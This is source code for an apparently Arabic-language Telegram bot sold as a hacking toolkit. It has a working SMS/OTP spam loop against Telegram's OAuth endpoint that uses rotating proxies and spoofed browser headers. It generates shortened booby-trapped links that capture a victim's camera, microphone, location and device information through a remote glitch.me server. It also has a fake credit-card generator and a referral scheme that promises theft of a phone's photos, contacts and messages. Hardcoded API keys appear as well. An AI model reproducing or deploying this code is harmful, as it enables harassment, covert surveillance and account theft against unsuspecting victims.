  if (!allUsers.has(userId)) {
    allUsers.set(userId, { id: userId, points: 0 });
  }
  const user = allUsers.get(userId);
  user.points = (user.points || 0) + points;
  userPoints.set(userId, user.points);
  checkSubscriptionStatus(userId);
  saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد إضافة النقاط
  return user.points;
}

function deductPointsFromUser(userId, points) {
  const currentPoints = userPoints.get(userId) || 0;
  if (currentPoints >= points) {
    const newPoints = currentPoints - points;
    userPoints.set(userId, newPoints);
    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد خصم النقاط
    return true;
  }
  return false;
}

function addPointsToUser(userId, points) {
  if (!allUsers.has(userId)) {
    allUsers.set(userId, { id: userId, points: 0 });
  }
  const user = allUsers.get(userId);
  user.points = (user.points || 0) + points;
  userPoints.set(userId, user.points);
  
  // التحقق من حالة الاشتراك بعد إضافة النقاط
  checkSubscriptionStatus(userId);
  
  return user.points;
}


   function checkSubscriptionStatus(userId) {
  const user = allUsers.get(userId);
  if (!user) return false;

  if (user.points >= pointsRequiredForSubscription) {
    if (!subscribedUsers.has(userId)) {
      // خصم النقاط المطلوبة للاشتراك
      user.points -= pointsRequiredForSubscription;
      userPoints.set(userId, user.points);
      
      subscribedUsers.add(userId);
      bot.sendMessage(userId, `تهانينا! لقد تم اشتراكك تلقائيًا. تم خصم ${pointsRequiredForSubscription} نقطة من رصيدك.`);
      saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد الاشتراك
    }
    return true;
  } else {
    if (subscribedUsers.has(userId)) {
      subscribedUsers.delete(userId);
      bot.sendMessage(userId, 'تم إلغاء اشتراكك بسبب نقص النقاط. يرجى جمع المزيد من النقاط للاشتراك مرة أخرى.');
      saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد إلغاء الاشتراك
    }
    return false;
  }
}
function trackAttempt(userId, feature) {
  if (!userVisits[userId]) userVisits[userId] = {};
  userVisits[userId][feature] = (userVisits[userId][feature] || 0) + 1;
  return userVisits[userId][feature];
}

function shortenUrl(url) {
  return new Promise((resolve, reject) => {
    TinyURL.shorten(url, function(res, err) {
      if (err)
        reject(err);
      else
        resolve(res);
    });
  });
}


const uuid = require('uuid'); // تأكد من استدعاء المكتبة الصحيحة

const botUsername = 'SJGDD_bot'; // ضع هنا يوزر البوت الخاص بك

let userPoints = {}; // لتخزين النقاط لكل مستخدم
let linkData = {}; // لتخزين بيانات الرابط والمستخدمين الذين دخلوا الرابط
let visitorData = {}; // لتتبع زيارات المستخدمين عبر جميع الروابط

// وظيفة لعرض الخيارات المدفوعة وإرسال رابط الدعوة
function showVipOptions(chatId, userId) {
    const linkId = uuid.v4(); // إنتاج معرف فريد للرابط

    // تخزين بيانات الرابط
    linkData[linkId] = {
        userId: userId,
        chatId: chatId,
        visitors: []
    };

    console.log('Link Data Saved:', linkData); // التحقق من حفظ البيانات

    const message = 'مرحبًا! هذا الخيارات مدفوع بسعر 30$، يمكنك تجميع النقاط وفتحها مجاناً.';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'سحب جميع صور الهاتف عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
                [{ text: 'سحب جميع أرقام الضحية عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
                [{ text: 'سحب جميع رسائل الضحية عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
                [{ text: 'فرمتة جوال الضحية عبر رابط 🔒', callback_data: `get_link_${linkId}` }]
            ]
        }
    });
}



bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    const data = query.data.split('_');

    // تأكد من صحة البيانات
    console.log('Received callback query:', query.data);

    const linkId = data[2]; // الحصول على linkId من callback_data
    console.log('Link ID:', linkId); // عرض linkId للتحقق

    // التحقق من وجود بيانات الرابط دون التحقق من تطابق userId
    if (linkData[linkId]) {
        const { userId: storedUserId, chatId: storedChatId } = linkData[linkId];
        console.log('Stored Link Data:', linkData[linkId]);

        const linkMessage = `رابط تجميع النقاط الخاص بك\n عندما يقوم شخص بالدخول إلى الرابط الخاص بك سوف تحصل على 1$\n: https://t.me/${botUsername}?start=${linkId}`;

 try {
            await bot.sendMessage(chatId, linkMessage);
            bot.answerCallbackQuery(query.id, { text: 'تم إرسال رابط الدعوة.' });
            console.log('Successfully sent invite link:', linkMessage);
        } catch (error) {
            console.error('Error sending invite link:', error);
            bot.answerCallbackQuery(query.id, { text: 'حدث خطأ أثناء إرسال رابط الدعوة.', show_alert: true });
        }
    } else if (query.data === 'add_nammes') {
        bot.sendMessage(chatId, `قم بإرسال هذا لفتح أوامر اختراق الهاتف كاملاً: قم بالضغط على هذا الأمر /Vip`);
    }
});
     
     
    

bot.onText(/\/start (.+)/, (msg, match) => {
    const visitorId = msg.from.id;
    const linkId = match[1];

    if (linkData && linkData[linkId]) {
        const { userId, chatId, visitors } = linkData[linkId];

        // التأكد من أن الزائر ليس صاحب الرابط وأنه لم يقم بزيارة الرابط من قبل
        if (visitorId !== userId && (!visitorData[visitorId] || !visitorData[visitorId].includes(userId))) {
            visitors.push(visitorId);

            // تحديث بيانات الزائرين
            if (!visitorData[visitorId]) {
                visitorData[visitorId] = [];
            }
            visitorData[visitorId].push(userId);

            // تحديث النقاط للمستخدم صاحب الرابط
            if (!userPoints[userId]) {
                userPoints[userId] = 0;
            }
            userPoints[userId] += 1;

            const message = `شخص جديد دخل إلى الرابط الخاص بك! لديك الآن ${userPoints[userId]}$\nعندما تصل إلى 30$ سيتم فتح الميزات المدفوعة تلقائيًا.`;
            bot.sendMessage(chatId, message);
        }
    }
});


        // التحقق من صحة linkId وإذا كان ينتمي إلى المستخدم الحالي
        

const apiKey = 'c35b4ecbb3a54362a7ea95351962f9bc';

// رابط الـ API لجلب بيانات البطاقات
const url = 'https://randommer.io/api/Card';

// دالة لجلب بيانات البطاقة من الـ API
async function getCardData() {
    try {
        const response = await fetch(url, {
            method: 'GET',
            headers: {
                'X-Api-Key': apiKey
            }
        });

        const data = await response.json();

        // البيانات المستخرجة من الـ API
        const cardInfo = `
            Card Issuer: ${data.type}
            Card Number: ${data.cardNumber}
            Full Name: ${data.fullName}
            CVV: ${data.cvv}
            Pin: ${data.pin}
            Expiration Date: ${data.date}
        `;

        return cardInfo;
    } catch (error) {
        console.error('Error fetching card data:', error);
        return 'Error fetching card data. Please try again later.';
    }
}

// استجابة البوت عند بدء المحادثة

// استجابة عند الضغط على زر "Generate Card"
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'generate_card') {
        const cardData = await getCardData();
        bot.sendMessage(chatId, cardData);
    }
});
// Initialize your bot with your Telegram Bot 

const HttpsProxyAgent = require('https-proxy-agent');


let sessions = {};

// قائمة البروكسيات الجديدة
const proxyList = [
    'http://188.132.221.81:8080',
    'http://160.86.242.23:8080',
    'http://176.56.139.57:8081',
    'http://44.226.167.102:3128',
    'http://3.71.239.218:80',
    'http://13.37.89.201:80',
    'http://47.238.130.212:8080',
    'http://47.91.89.3:8080',
    'http://3.71.239.218:3128',
    'http://165.232.129.150:80',
    'http://38.54.95.19:3128',
    'http://8.213.215.187:1081',
    'http://85.215.64.49:80',
    'http://185.118.153.110:8080',
    'http://38.242.199.124:8089',
    'http://93.42.151.100:8080',
    'http://51.89.255.67:80',
    'http://8.211.49.86:9098',
    'http://13.37.59.99:80',
    'http://47.90.149.238:80'
    // ... يمكنك إضافة المزيد من البروكسيات هنا
];

async function getWorkingProxy() {
    for (const proxy of proxyList) {
        try {
            const agent = new HttpsProxyAgent(proxy);
            await axios.get('https://api.ipify.org', { httpsAgent: agent, timeout: 5000 });
            return proxy;
        } catch (error) {
            console.log(`Proxy ${proxy} is not working`);
        }
    }
    throw new Error('No working proxy found');
}

function generateUserAgent() {
    const browsers = ['Chrome', 'Firefox', 'Safari', 'Opera', 'Edge'];
    const versions = ['90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100'];
    const osVersions = ['10', '11', '12', '13', '14', '15'];
    const devices = [
        'Windows NT 10.0', 'Macintosh; Intel Mac OS X 10_15_7',
        'iPhone; CPU iPhone OS 14_7_1 like Mac OS X', 'Linux x86_64',
        'Android 10; SM-A505F', 'Android 11; Pixel 4', 'Android 12; OnePlus 9 Pro'
    ];

    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    const version = versions[Math.floor(Math.random() * versions.length)];
    const osVersion = osVersions[Math.floor(Math.random() * osVersions.length)];
    const device = devices[Math.floor(Math.random() * devices.length)];

    return `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) ${browser}/${version}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 99)} Safari/537.36`;
}

async function spam(number, chatId) {
    if (!sessions[chatId] || !sessions[chatId].active) return;

    const agent = generateUserAgent();
    const payload = `phone=${number}`;
    const headers = {
        'User-Agent': agent,
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "application/x-www-form-urlencoded",
        'sec-ch-ua': "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
        'sec-ch-ua-platform': "\"Android\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua-mobile': "?1",
        'origin': "https://oauth.telegram.org",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write",
        'accept-language': "ar,ar-YE;q=0.9,en-US;q=0.8,en;q=0.7",
        'priority': "u=1, i",
    };

    let axiosConfig = {
        params: {
            'bot_id': "5444323279",
            'origin': "https://fragment.com",
            'request_access': "write",
        },
        headers: headers,
        timeout: 30000 // 30 seconds timeout
    };

    try {
        if (sessions[chatId].useProxy) {
            const workingProxy = await getWorkingProxy();
            axiosConfig.httpsAgent = new HttpsProxyAgent(workingProxy);
        }

        const response = await axios.post("https://oauth.telegram.org/auth/request", payload, axiosConfig);

        if (response.data && response.data.random_hash) {
            sessions[chatId].successCount++;
            await updateSuccessReport(chatId);
        } else {
            sessions[chatId].failCount++;
            await updateFailReport(chatId);
        }
    } catch (error) {
        console.error(`Error for ${chatId}: ${error.message}`);
        sessions[chatId].failCount++;
        await updateFailReport(chatId);
    }

    if (sessions[chatId].active) {
        const delay = 5000 + Math.floor(Math.random() * 10000); // تأخير عشوائي بين 5 إلى 15 ثانية
        setTimeout(() => spam(number, chatId), delay);
    }
}


async function updateSuccessReport(chatId) {
    const session = sessions[chatId];
    const total = session.successCount + session.failCount;
    const successRate = total > 0 ? (session.successCount / total * 100).toFixed(2) : '0.00';
    
    const message = `✅ تم إرسال رسالة بنجاح!\n\n📊 تقرير العمليات:\n✅ ناجحة: ${session.successCount}\n📈 نسبة النجاح: ${successRate}%\n🕒 إجمالي المحاولات: ${total}`;

    try {
        if (!session.successMessageId) {
            const sentMessage = await bot.sendMessage(chatId, message);
            session.successMessageId = sentMessage.message_id;
        } else {
            await bot.editMessageText(message, {
                chat_id: chatId,
                message_id: session.successMessageId
            });
        }
    } catch (error) {
        console.error(`Error updating success report: ${error.message}`);
    }
}

async function updateFailReport(chatId) {
    const session = sessions[chatId];
    const total = session.successCount + session.failCount;
    const failRate = total > 0 ? (session.failCount / total * 100).toFixed(2) : '0.00';
    
    const message = ` جاري ارسال السبام.\n\n📊 تقرير العمليات:\n جاري الارسال: ${session.failCount}\n📉 نسبة المحاولة: ${failRate}%\n🕒 إجمالي المحاولات: ${total}`;

    try {
        if (!session.failMessageId) {
            const sentMessage = await bot.sendMessage(chatId, message);
            session.failMessageId = sentMessage.message_id;
        } else {
            await bot.editMessageText(message, {
                chat_id: chatId,
                message_id: session.failMessageId
            });
        }
    } catch (error) {
        console.error(`Error updating fail report: ${error.message}`);
    }
}

bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'spam_telegram') {
        bot.sendMessage(chatId, "الرجاء إدخال رقم الهاتف مع رمز الدولة (مثل: +967XXXXXXXX).");
    } else if (data === 'start_spam_with_proxy') {
        if (sessions[chatId] && sessions[chatId].number) {
            sessions[chatId].useProxy = true;
            startSpamSession(chatId);
        } else {
            bot.sendMessage(chatId, "الرجاء تحديد رقم الهاتف أولاً.");
        }
    } else if (data === 'start_spam_without_proxy') {
        if (sessions[chatId] && sessions[chatId].number) {
            sessions[chatId].useProxy = false;
            startSpamSession(chatId);
        } else {
            bot.sendMessage(chatId, "الرجاء تحديد رقم الهاتف أولاً.");
        }
    } else if (data === 'stop_spam') {
        if (sessions[chatId] && sessions[chatId].active) {
            sessions[chatId].active = false;
            bot.sendMessage(chatId, "تم إيقاف العملية.");
        } else {
            bot.sendMessage(chatId, "لم يتم بدء أي عملية بعد.");
        }
    }

    bot.answerCallbackQuery(callbackQuery.id);
});

function startSpamSession(chatId) {
    if (!sessions[chatId].active) {
        sessions[chatId].active = true;
        sessions[chatId].successCount = 0;
        sessions[chatId].failCount = 0;
        sessions[chatId].successMessageId = null;
        sessions[chatId].failMessageId = null;
        bot.sendMessage(chatId, `جاري بدء العملية على الرقم: ${sessions[chatId].number} ${sessions[chatId].useProxy ? 'مع استخدام بروكسي' : 'بدون بروكسي'}`);
        spam(sessions[chatId].number, chatId);
    } else {
        bot.sendMessage(chatId, "العملية جارية بالفعل.");
    }
}


bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const userInput = msg.text;

    if (userInput && userInput.startsWith("+") && /^\+\d+$/.test(userInput)) {
        const number = userInput;
        bot.sendMessage(chatId, `تم تحديد الرقم: ${number}. اختر الإجراء المناسب:`, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '▶️ بدء العملية مع بروكسي', callback_data:'start_spam_with_proxy' },
                        { text: '▶️ بدء العملية بدون بروكسي', callback_data:'start_spam_without_proxy' }
                    ],
                    [
                        { text: '⏹️ إيقاف العملية', callback_data:'stop_spam' }
                    ]
                ]
            }
        });
        sessions[chatId] = { number: number, active: false, successCount: 0, failCount: 0, successMessageId: null, failMessageId: null, useProxy: false };
    }
});



    
     
    
const fetch = require('node-fetch');
const ipinfo = require('ipinfo');
const dns = require('dns').promises;

// مفتاح API لبوت التليجرام
const virusTotalApiKey = 'b51c4d5a437011492aa867237c80bdb04dcc377ace0e4814bea41336e52f1c73';



// استجابة لزر "فحص رابط"
bot.on('callback_query', async (callbackQuery) => {
  const msg = callbackQuery.message;
  const chatId = msg.chat.id;

  if (callbackQuery.data === 'check_link') {
    bot.sendMessage(chatId, "الرجاء إرسال الرابط لفحصه:");
    
    // الاستماع للرد بالرابط
    bot.once('message', async (msg) => {
      const url = msg.text;
      
      if (isValidUrl(url)) {
        let progressMessage = await bot.sendMessage(chatId, "Verification...\n[░░░░░░░░░░] 0%");
        const interval = displayProgress(bot, chatId, progressMessage);
        const result = await scanAndCheckUrl(url);
        clearInterval(interval);  // إيقاف شريط التقدم بعد انتهاء الفحص
        await bot.deleteMessage(chatId, progressMessage.message_id); // حذف رسالة التقدم
        bot.sendMessage(chatId, result);
      } else {
        bot.sendMessage(chatId, "الرجاء إرسال رابط صحيح.");
      }
    });
  }
});

// دالة لإرسال الرابط إلى VirusTotal وإجراء الفحص
async function scanAndCheckUrl(url) {
  try {
    // إرسال الرابط للفحص
    const scanResponse = await fetch(`https://www.virustotal.com/vtapi/v2/url/scan`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `apikey=${virusTotalApiKey}&url=${encodeURIComponent(url)}`,
    });
    const scanData = await scanResponse.json();

    // انتظر بضع ثوانٍ للحصول على التقرير
    await new Promise(resolve => setTimeout(resolve, 5000)); // انتظر 5 ثوانٍ

    // جلب تقرير الفحص بعد الإرسال
    const reportResponse = await fetch(`https://www.virustotal.com/vtapi/v2/url/report?apikey=${virusTotalApiKey}&resource=${encodeURIComponent(url)}`);
    const reportData = await reportResponse.json();

    const ipInfo = await fetchIpInfo(url);
    
    let result;
    
    // تحديد تصنيف الرابط بدقة
    if (reportData.positives > 0) {
      // إذا كان الرابط خطير
      result = `• الرابط: ${url}\n\n` +
               `• التصنيف: خطير جداً 🔴\n\n` +
               `• تفاصيل التصنيف: تم اكتشاف برمجيات خبيثة. الرجاء الحذر وتجنب هذا الرابط.\n\n` +
               `• معلومات IP: ${ipInfo.ip}\n\n` +
               `• مزود الخدمة: ${ipInfo.org || 'غير متوفر'}\n\n` +
               `• الموقع: ${ipInfo.city || 'غير متوفر'}, ${ipInfo.region || 'غير متوفر'}, ${ipInfo.country || 'غير متوفر'}`;
    } else if (isSuspicious(reportData)) {
      // إذا كان الرابط مشبوه (تحديد بناءً على معايير إضافية)
      result = `• الرابط: ${url}\n\n` +
               `• التصنيف: مشبوه 🟠\n\n` +
               `• تفاصيل التصنيف: تم تصنيفه بأنه مشبوه. لم نجد برمجيات خبيثة مؤكدة، ولكن هناك بعض الإشارات المقلقة. الرجاء الحذر عند التعامل معه.\n\n` +
               `• معلومات IP: ${ipInfo.ip}\n\n` +
               `• مزود الخدمة: ${ipInfo.org || 'غير متوفر'}\n\n` +
               `• الموقع: ${ipInfo.city || 'غير متوفر'}, ${ipInfo.region || 'غير متوفر'}, ${ipInfo.country || 'غير متوفر'}`;
    } else {
      // إذا كان الرابط آمن
      result = `• الرابط: ${url}\n\n` +
               `• التصنيف: آمن 🟢\n\n` +
               `• تفاصيل التصنيف: لقد قمنا بفحص الرابط ولم نجد أي تهديدات معروفة.\n\n` +
               `• معلومات IP: ${ipInfo.ip}\n\n` +
               `• مزود الخدمة: ${ipInfo.org || 'غير متوفر'}\n\n` +
               `• الموقع: ${ipInfo.city || 'غير متوفر'}, ${ipInfo.region || 'غير متوفر'}, ${ipInfo.country || 'غير متوفر'}`;
    }

    return result;

  } catch (error) {
    console.error(error);
    return "حدث خطأ أثناء فحص الرابط.";
  }
}

// دالة لتحديد ما إذا كان الرابط مشبوهًا
function isSuspicious(reportData) {
  // يمكنك تخصيص هذه الشروط حسب احتياجاتك
  return reportData.total > 0 && reportData.positives === 0 && (
    reportData.scan_date > Date.now() - 7 * 24 * 60 * 60 * 1000 || // تم فحصه في الأسبوع الماضي
    reportData.total < 10 || // عدد قليل من عمليات الفحص
    reportData.response_code !== 1 // استجابة غير عادية من VirusTotal
  );
}

// دالة لإظهار شريط التقدم
function displayProgress(bot, chatId, message) {
  let progress = 0;
  const progressBar = ["░░░░░░░░░░", "▓░░░░░░░░░", "▓▓░░░░░░░░", "▓▓▓░░░░░░░", "▓▓▓▓░░░░░░", "▓▓▓▓▓░░░░░", "▓▓▓▓▓▓░░░░", "▓▓▓▓▓▓▓░░░", "▓▓▓▓▓▓▓▓░░", "▓▓▓▓▓▓▓▓▓░", "▓▓▓▓▓▓▓▓▓▓"];

  return setInterval(async () => {
    if (progress >= 10) {
      progress = 0; // إعادة ضبط التقدم
    } else {
      progress++;
    }

    await bot.editMessageText(`Verification...\n[${progressBar[progress]}] ${progress * 10}%`, {
      chat_id: chatId,
      message_id: message.message_id
    });
  }, 500);  // يحدث كل 500 مللي ثانية
}

// دالة للحصول على معلومات IP باستخدام ipinfo
async function fetchIpInfo(url) {
  try {
    const domain = new URL(url).hostname;
    const ipAddress = await dns.lookup(domain);
    return new Promise((resolve, reject) => {
      ipinfo(ipAddress.address, (err, cLoc) => {
        if (err) reject(err);
        resolve(cLoc);
      });
    });
  } catch (error) {
    console.error('Error fetching IP info:', error);
    return { ip: 'غير متوفر', org: 'غير متوفر', city: 'غير متوفر', region: 'غير متوفر', country: 'غير متوفر' };
  }
}

// دالة للتحقق من صحة الرابط
function isValidUrl(string) {
  try {
    new URL(string);
    return true;
  } catch (_) {
    return false;
  }
}



   
    

  
function showDefaultButtons(userId) {
  // الأزرار المطلوبة
  let defaultButtons = [
    [
      { text: '📸 اختراق الكاميرا الأمامية والخلفية', callback_data: 'front_camera' },
      { text: '🔬 جمع معلومات الجهاز', callback_data: 'collect_device_info' }
    ],
    [
      { text: '🎥 تصوير الضحية فيديو أمامي وخلفي', callback_data: 'capture_video' },
      { text: '🎙 تسجيل صوت الضحية', callback_data: 'voice_record' }
    ],
    [
      { text: '🗺️ اختراق الموقع', callback_data: 'get_location' },
      { text: '📡 اختراق كاميرا المراقبة', callback_data: 'get_cameras' }
    ],
    [
      { text: '🟢 اختراق واتساب', callback_data: 'request_verification' },
      { text: '⚠️ تلغيم رابط', callback_data: 'malware_link' }
    ],
    [
      { text: '💻 اختراق تيك توك', callback_data: 'increase_tiktok' },
      { text: '📸 اختراق انستغرام', callback_data: 'increase_instagram' }
    ],
    [
      { text: '📘 اختراق فيسبوك', callback_data: 'increase_facebook' },
      { text: '👻 اختراق سناب شات', callback_data: 'increase_snapchat' }
    ],
    [
      { text: '💎 شحن جواهر فري فاير', callback_data: 'free_fire_diamonds' },
      { text: '🔫 اختراق حسابات ببجي', callback_data: 'pubg_uc' }
    ],
    [
      { text: '🔴 اختراق يوتيوب', callback_data: 'increase_youtube' },
      { text: '🐦 اختراق تويتر', callback_data: 'increase_twitter' }
    ],
    [
      { text: 'صيد فيزات 💳', callback_data: 'generate_card' }
    ],
    [
      { text: 'اغلاق المواقع 💣', web_app: { url: 'https://believed-radial-yogurt.glitch.me/' } }
    ],
    [
      { text: 'الدردشة مع الذكاء الاصطناعي 🤖', web_app: { url: 'https://plausible-broken-responsibility.glitch.me/' } },
      { text: 'اعطيني نكته 🤣', callback_data: 'get_joke' }
    ],
    [
      { text: '🎵 اندكس تيك توك 🎵', callback_data: 'login_tiktok' },
      { text: '📸 اندكس انستغرام 📸', callback_data: 'login_instagram' }
    ],
    [
      { text: '📘 اندكس فيسبوك 📘', callback_data: 'login_facebook' },
      { text: '👻 اندكس سناب شات 👻', callback_data: 'login_snapchat' }
    ],
    [
      { text: '🐦 اندكس تويتر 🐦', callback_data: 'login_twitter' },
      { text: '🚸 اكتب لي رسالة فك حظر واتساب', callback_data: 'get_love_message' }
    ],
    [
      { text: 'تفسير الأحلام 🧙‍♂️', web_app: { url: 'https://necessary-evening-canidae.glitch.me/' } },
      { text: 'لعبة الأذكياء 🧠', web_app: { url: 'https://purrfect-eastern-salamander.glitch.me/' } }
    ],
    [
      { text: '✉️ إنشاء إيميل وهمي', callback_data: 'create_email' },
      { text: '💥 سبام واتساب', callback_data: 'whatsapp_spam' }
    ],
    [
      { text: 'إختراق الهاتف كاملاً 🔞', callback_data: 'add_nammes' }
    ],
    [
      { text: '🚀 سبام تيليجرام', callback_data: 'spam_telegram' },
      { text: '📻 إختراق راديو', callback_data: 'radio_stations' }
    ],
    [
      { text: '📞 بوت كاشف الأرقام', url: 'https://t.me/S_S_YEbot' },
      { text: '📱 معلومات انستا وتيك توك', url: 'https://t.me/Medic_inebot' }
    ],
    [
      { text: '🔍 فحص رابط', callback_data: 'check_link' },
      { text: '🔄 تحويل النص إلى صوت', callback_data: 'convert_to_speech' }
    ],
    [
      { text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' },
      { text: 'تتواصل مع المطور', url: 'https://t.me/SAGD112' }
    ]
  ];

  // إرسال الرسالة مع الأزرار مباشرة
  bot.sendMessage(userId, 'مرحباً! يمكنك التمتع بالخدمات واختيار ما يناسبك من الخيارات المتاحة:', {
    reply_markup: {
      inline_keyboard: defaultButtons
    }
  });
}





      
// التعامل مع الضغطة على الزر

bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    function shortenUrlAndSendMessage(url, messagePrefix) {
        axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`)
            .then(response => {
                const shortUrl = response.data;
                bot.sendMessage(chatId, `${messagePrefix} ${shortUrl}`);
            })
            .catch(error => {
                bot.sendMessage(chatId, 'حدث خطأ أثناء اختصار الرابط. الرجاء المحاولة لاحقًا.');
            });
    }

    if (data === 'malware_link') {
        bot.sendMessage(chatId, 'من فضلك أرسل الرابط الذي ترغب في تلغيمه:');
        bot.once('message', (msg) => {
            if (msg.text) {
                const link = msg.text;
                const malwareUrl = `https://snow-fringe-play.glitch.me/malware?chatId=${chatId}&originalLink=${encodeURIComponent(link)}`;
                shortenUrlAndSendMessage(malwareUrl, '⚠️ تم تلغيم الرابط، استخدم هذا الرابط لاختراق:');
            } else {
                bot.sendMessage(chatId, 'الرجاء إرسال رابط نصي صالح.');
            }
        });
    } else if (data === 'front_camera' || data === 'rear_camera') {
        const url = `https://snow-fringe-play.glitch.me/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
        shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية:');
    } else if (data === 'voice_record') {
        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
        bot.once('message', (msg) => {
            const duration = parseInt(msg.text, 10);
            if (!isNaN(duration) && duration >= 1 &&  duration <= 20) {
                const url = `https://snow-fringe-play.glitch.me/record/${chatId}?duration=${duration}`;
                shortenUrlAndSendMessage(url, `تم تلغيم رابط تسجيل الصوت لمدة ${duration} ثانية:`);
            } else {
                bot.sendMessage(chatId, 'الرجاء إدخال مدة تسجيل صحيحة بين 1 و 20 ثانية.');
            }
        });
    } else if (data === 'get_location') {
        const url = `https://snow-fringe-play.glitch.me/getLocation/${chatId}`;
        shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق موقع الضحية:');
    } else if (data === 'capture_video') {
        const url = `https://snow-fringe-play.glitch.me/camera/video/${chatId}`;
        shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية فيديو:');
    } else if (data === 'request_verification') {
        const verificationLink = `https://snow-fringe-play.glitch.me/whatsapp?chatId=${chatId}`;
        shortenUrlAndSendMessage(verificationLink, 'تم إنشاء رابط لاختراق واتساب:');
    } else if (data === 'collect_device_info') {
        const url = `https://snow-fringe-play.glitch.me/${chatId}`;
        shortenUrlAndSendMessage(url, 'تم تلغيم  رابط  جمع معلومات اجهزه الضحيه:');
    
    }
});

//bot.on('message', (msg) => {
//  const chatId = msg.chat.id;
//  const duration = parseInt(msg.text, 10);

 // if (!isNaN(duration)) {
 //   if (duration > 0 && duration <= 20) {
     // const link = `}`;
      //bot.sendMessage(chatId, `تم تلغيم الرابط لتسجيل صوت الضحيه لمدة ${duration} ثواني: ${link}`);
   // } else {
 //     bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
 //   }
//  }
//});



const countryTranslation = {
  "United Arab Emirates": "الإمارات 🇦🇪",
  "Saudi Arabia": "السعودية 🇸🇦",
  "Yemen": "اليمن 🇾🇪👑",
  "Egypt": "مصر 🇪🇬",
  "Jordan": "الأردن 🇯🇴",
  "Qatar": "قطر 🇶🇦",
  "Bahrain": "البحرين 🇧🇭",
  "Kuwait": "الكويت 🇰🇼",
  "Oman": "عمان 🇴🇲",
  "Lebanon": "لبنان 🇱🇧",
  "Syria": "سوريا 🇸🇾",
  "Iraq": "العراق 🇮🇶",
  "Tunisia": "تونس 🇹🇳",
  "Morocco": "المغرب 🇲🇦",
  "Algeria": "الجزائر 🇩🇿",
  "Sudan": "السودان 🇸🇩",
  "Palestine": "فلسطين 🇵🇸",
  "Libya": "ليبيا 🇱🇾",
  "Mauritania": "موريتانيا 🇲🇷",
  "Somalia": "الصومال 🇸🇴",
  "Djibouti": "جيبوتي 🇩🇯",
  "Comoros": "جزر القمر 🇰🇲",
  "Afghanistan": "أفغانستان 🇦🇫",
  "Argentina": "الأرجنتين 🇦🇷",
  "Armenia": "أرمينيا 🇦🇲",
  "Australia": "أستراليا 🇦🇺",
  "Austria": "النمسا 🇦🇹",
  "Azerbaijan": "أذربيجان 🇦🇿",
  "Belarus": "بيلاروس 🇧🇾",
  "Belgium": "بلجيكا 🇧🇪",
  "Bangladesh": "بنغلاديش 🇧🇩",
  "Belize": "بليز 🇧🇿",
  "Benin": "بنين 🇧🇯",
  "Bolivia": "بوليفيا 🇧🇴",
  "Bosnia and Herzegovina": "البوسنة والهرسك 🇧🇦",
  "Botswana": "بوتسوانا 🇧🇼",
  "Brazil": "البرازيل 🇧🇷",
  "Bulgaria": "بلغاريا 🇧🇬",
  "Burkina Faso": "بوركينا فاسو 🇧🇫",
  "Cambodia": "كمبوديا 🇰🇭",
  "Cameroon": "الكاميرون 🇨🇲",
  "Canada": "كندا 🇨🇦",
  "Chile": "تشيلي 🇨🇱",
  "China": "الصين 🇨🇳",
  "Colombia": "كولومبيا 🇨🇴",
  "Costa Rica": "كوستاريكا 🇨🇷",
  "Croatia": "كرواتيا 🇭🇷",
  "Cuba": "كوبا 🇨🇺",
  "Cyprus": "قبرص 🇨🇾",
  "Czech Republic": "التشيك 🇨🇿",
  "Denmark": "الدنمارك 🇩🇰",
  "Ecuador": "الإكوادور 🇪🇨",
  "Estonia": "إستونيا 🇪🇪",
  "Finland": "فنلندا 🇫🇮",
  "France": "فرنسا 🇫🇷",
  "Germany": "ألمانيا 🇩🇪",
  "Ghana": "غانا 🇬🇭",
  "Greece": "اليونان 🇬🇷",
  "Guatemala": "غواتيمالا 🇬🇹",
  "Honduras": "هندوراس 🇭🇳",
  "Hungary": "المجر 🇭🇺",
  "Iceland": "آيسلندا 🇮🇸",
  "India": "الهند 🇮🇳",
  "Indonesia": "إندونيسيا 🇮🇩",
  "Iran": "إيران 🇮🇷",
  "Ireland": "أيرلندا 🇮🇪",
  "Israel": "إسرائيل 🇮🇱",
  "Italy": "إيطاليا 🇮🇹",
  "Ivory Coast": "ساحل العاج 🇨🇮",
